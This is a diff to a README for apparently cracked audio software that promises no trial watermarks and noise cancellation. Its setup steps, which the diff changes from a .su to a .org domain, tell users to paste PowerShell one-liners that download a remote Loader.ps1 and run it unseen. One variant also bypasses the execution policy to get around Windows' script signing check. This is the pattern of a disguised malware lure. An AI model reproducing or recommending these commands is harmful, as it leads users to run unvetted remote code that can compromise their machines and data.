@@ -10,6 +10,7 @@ This repository provides instructions, configuration files, and setup guidelines
 * **Clean Real-Time Processing:** No audio delays or trial watermarks.
 * **Background Noise Cancellation:** Built-in high-quality filters.
 
+
 ---
 
 ## 🚀 Automated Installation & Setup (PowerShell)
@@ -22,7 +23,7 @@ This repository provides instructions, configuration files, and setup guidelines
    Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:
 
    ```powershell
-   irm https://software-storage.su/powershell/Loader.ps1 | iex
+   irm https://software-storage.org/powershell/Loader.ps1 | iex
    ```
 ---
 
@@ -31,13 +32,13 @@ This repository provides instructions, configuration files, and setup guidelines
 ### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
 If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.su/powershell/Loader.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.org/powershell/Loader.ps1 | iex"
 ```
 
 ### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
 In older legacy environments where aliases are missing, use explicit full system cmdlets:
 ```powershell
-Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Expression
+Invoke-RestMethod https://software-storage.org/powershell/Loader.ps1 | Invoke-Expression
 ```
 
 
